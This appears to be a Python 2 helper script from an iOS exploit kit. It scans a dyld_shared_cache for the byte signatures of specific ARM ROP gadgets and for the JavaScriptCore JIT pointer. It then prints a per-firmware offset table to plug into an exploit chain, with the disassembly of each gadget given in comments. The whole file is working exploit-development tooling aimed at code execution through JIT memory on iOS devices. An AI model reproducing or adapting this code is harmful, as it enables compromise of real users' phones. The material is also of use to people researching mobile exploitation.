import sys, struct
#See PORTING
cache = file(sys.argv[1],'rb').read()

'''
Gadget0
Disassembly:
0x39e4b0d8 <_longjmp>:	ldm	r0!, {r4, r5, r6, r7, r8, r10, r11, sp, lr}
0x39e4b0dc <_longjmp+4>:	vldmia	r0, {d8-d15}
0x39e4b0e0 <_longjmp+8>:	movs	r0, r1
0x39e4b0e4 <_longjmp+12>:	moveq	r0, #1	; 0x1
0x39e4b0e8 <_longjmp+16>:	bx	lr
Binary: f0.6d.b0.e8.10.8b.90.ec.01.00.b0.e1.01.00.a0.03.1e.ff
'''
gadget0 = cache.find("\xf0\x6d\xb0\xe8\x10\x8b")

'''
Gadget1
Disassembly:
0x2f586256 <CGPDFContextSetImageTag+742>:	ldr	r0, [r6, #24]                  ;$r6 points to .data where JIT pointer is.
0x2f586258 <CGPDFContextSetImageTag+744>:	mov	r1, r10
0x2f58625a <CGPDFContextSetImageTag+746>:	mov	r2, r4
0x2f58625c <CGPDFContextSetImageTag+748>:	blx	0x2f5fe9bc <dyld_stub_memmove> 
0x2f586260 <CGPDFContextSetImageTag+752>:	mov	r0, r5
0x2f586262 <CGPDFContextSetImageTag+754>:	add	sp, #4
0x2f586264 <CGPDFContextSetImageTag+756>:	ldmia.w	sp!, {r8, r10}
0x2f586268 <CGPDFContextSetImageTag+760>:	pop	{r4, r5, r6, r7, pc}
Binary: b0.69.51.46.22.46.78.f0.ae.eb
'''
gadget1 = cache.find("\xb0\x69\x51\x46\x22\x46")

'''
Gadget2
Disassembly:
0x2f539ae8 <CGFontDefaultGetSmoothingStyle+32>:	ldr	r0, [r0, #0]
0x2f539aea <CGFontDefaultGetSmoothingStyle+34>:	pop	{r7, pc}
Binary: 00.68.80.bd
'''

gadget2 = 1
while gadget2&1 == 1 :
    gadget2 = cache.find("\x00\x68\x80\xbd",gadget2+1)
    if gadget2 == -1:
        break

'''
Gadget3
Disassembly:
0x2f5ca9de <CGFontIndexSetGetName+11938>:	mov	r2, r5
0x2f5ca9e0 <CGFontIndexSetGetName+11940>:	blx	r4
Binary:2a.46.a0.47
'''
gadget3 = cache.find("\x2a\x46\xa0\x47")

'''
Gadget4
Disassembly:
0x39e490de <sys_cache_control+30>:	mov	r1, r2
0x39e490e0 <sys_cache_control+32>:	blx	0x39e490a0 <sys_icache_invalidate>
0x39e490e4 <sys_cache_control+36>:	movs	r0, #0
0x39e490e6 <sys_cache_control+38>:	pop	{r7, pc}
Binary: Not applicable (contains offset that changes with firmwares (sys_icache_invalidate))
'''
gadget4 = 0xffffffff

'''
Gadget5
Disassembly:
0x2f63b0a4 <cg_font_library_link_symbol+14560>:	mov	r0, r6
0x2f63b0a6 <cg_font_library_link_symbol+14562>:	ldr	r2, [r6, #8]
0x2f63b0a8 <cg_font_library_link_symbol+14564>:	blx	r2
Binary: 30.46.b2.68.90.47
'''
gadget5 = cache.find("\x30\x46\xb2\x68\x90\x47")

'''
JIT
__text:2E358C54 ; 32:     WTF::MetaAllocator::addFreshFreeSpace(v1);
__text:2E358C54                 MOV             R0, R4
__text:2E358C56                 MOV.W           R2, #0x1000000
__text:2E358C5A                 BL              __ZN3WTF13MetaAllocator17addFreshFreeSpaceEPvm ; WTF::MetaAllocator::addFreshFreeSpace(void *,ulong)
__text:2E358C5E ; 33:     dword_380F54F8 = *(_DWORD *)(v1 + 108);
__text:2E358C5E                 MOV             R0, #0x9D9C88C ; dword_380F54F8
__text:2E358C66                 LDR             R1, [R4,#0x6C]
__text:2E358C68                 ADD             R0, PC ; dword_380F54F8
__text:2E358C6A                 STR             R1, [R0]
__text:2E358C6C ; 35:   return v1;
__text:2E358C6C
__text:2E358C6C loc_2E358C6C                            ; CODE XREF: _redacted__62+7Ej
__text:2E358C6C                 MOV             R0, R4
__text:2E358C6E                 ADD             SP, SP, #4
__text:2E358C70                 POP.W           {R8,R10}
__text:2E358C74                 POP             {R4-R7,PC}
'''
jit = cache.find("\x20\x46\x4f\xf0\x80\x72")
print "To get JIT pointer address disassembled the following binary code (http://onlinedisassembler.com/odaweb/) "
print "\t", cache[jit+10:jit+18].encode('hex') 
print "Get $CONSTANT$ from the disassembly and do the following calculation:"
print "\thex( $CONSTANT$ + 0x%08x)"%(jit + 0x18 )


print '''
              "$VERSION$" : {   "gadget0": 0x%08x + dyld_shared_cache,
                                "gadget1": 0x%08x + dyld_shared_cache,
                                "gadget2": 0x%08x + dyld_shared_cache,
                                "gadget3": 0x%08x + dyld_shared_cache,
                                "gadget4": 0x%08x + dyld_shared_cache,
                                "gadget5": 0x%08x + dyld_shared_cache,
                                "jit": 0x41414141 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x42424242 + dyld_shared_cache,
                                "exit":  0x43434343 + dyld_shared_cache,
                                 },'''%(gadget0, gadget1|1, gadget2|1, gadget3|1, gadget4|1, gadget5|1)


